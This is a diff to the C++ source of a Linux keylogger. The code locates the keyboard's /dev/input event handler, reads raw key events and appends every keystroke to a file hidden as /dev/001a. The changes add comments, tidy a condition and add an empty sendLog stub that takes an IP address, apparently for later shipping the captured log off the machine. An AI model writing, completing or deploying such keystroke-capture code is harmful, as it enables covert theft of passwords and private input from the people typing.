@@ -167,7 +167,7 @@ std::string logger::getHandler(std::string devices, bool verbose) {
 	std::smatch m;  // flag type for determining the matching behavior (in this case on string objects)
 	std::regex regexp("Handlers=sysrq kbd event[0-9]"); // regex expression for pattern to be searched
 	
-	std::regex_search(devices, m, regexp);
+	std::regex_search(devices, m, regexp); //Finds the line containing the handler to the keyboard
 	if (verbose) std::cout << "Using regex to search for handler." << std::endl;
 	if (m.size() == 0){
 		std::cout << "regex search returned no match! Aborting!" << std::endl;
@@ -176,8 +176,8 @@ std::string logger::getHandler(std::string devices, bool verbose) {
 	if (verbose) std::cout << "Regex search return: \x1B[32m" << m[0] << "\x1B[0m" << std::endl;
 	if (verbose) std::cout << "Creating path to handler." << std::endl;
 	
-	std::string matched = m[0];
-	size_t pos = matched.find("event");
+	std::string matched = m[0]; 
+	size_t pos = matched.find("event"); //Used to find name of handler
 	handler = "/dev/input/" + matched.substr (pos);
 	if (verbose) std::cout << "Path: \x1B[32m" << handler << "\x1B[0m" << std::endl;
 	return handler;
@@ -246,7 +246,7 @@ void logger::connectHandler (std::string handler, bool verbose) {
 	}
 
 	std::ofstream logFile;
-	if (!(fileExist ("/dev/001a") == true)) {
+	if (!(fileExist ("/dev/001a"))) {
 		if (verbose) std::cout << "Creating new file: \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
 		logFile.open("/dev/001a", std::ios_base::app);
 	}
@@ -256,7 +256,7 @@ void logger::connectHandler (std::string handler, bool verbose) {
 	} 
 
 	if (verbose) std::cout << "To exit press ESC." << std::endl;
-	if (verbose) disableEcho(verbose);
+	if (verbose) disableEcho(verbose); //Disables console ECHO. Remains disable after program ends if not re-enabled.
 	while (true) {
 		read(fd, &holdEvent, sizeof(holdEvent));
 		
@@ -265,7 +265,7 @@ void logger::connectHandler (std::string handler, bool verbose) {
 				// '\x1B[1m' and '\x1B[0m' allows for bolding in console window. These can be safely removed without damaging computer
 				std::cout << "holdEvent.code: \x1B[1m" << holdEvent.code << "\x1B[0m\t";
 				std::cout << "KeyCode: \x1B[1m" << keyCodes[holdEvent.code] << "\x1B[0m" <<std::endl;
-				logFile << keyCodes[holdEvent.code];
+				logFile << keyCodes[holdEvent.code]; //Record in file.
 			}
 			else {
 				logFile << keyCodes[holdEvent.code];
@@ -275,12 +275,16 @@ void logger::connectHandler (std::string handler, bool verbose) {
 			break;
 		}
 	}
-	if (verbose) enableEcho(verbose);
+	if (verbose) enableEcho(verbose); //Enables console ECHO.
 	if (verbose) std::cout << "Closing \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
 	logFile.close();
 
 	if (verbose) std::cout << "Closed connection to handler." << std::endl;
 	close(fd);
+	return;
+}
+
+void logger::sendLog (std::string logName, std::string ipAddress, bool verbose) {
 	return;
 }
 
